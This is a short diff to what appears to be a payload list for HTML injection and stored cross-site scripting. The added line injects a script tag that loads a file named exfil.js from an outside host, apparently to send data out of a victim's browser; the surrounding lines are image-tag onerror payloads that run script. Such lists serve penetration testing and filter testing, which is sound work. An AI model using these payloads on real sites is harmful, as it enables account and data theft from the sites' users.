@@ -9,6 +9,8 @@ HTML Injection:
 Stored XSS
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+“><script src=“https://abhilash.pk//exfil.js”></script>
+
 "><img src=x onerror=alert(101)>
 
 "><<img onerror=alert(document.domain) src>
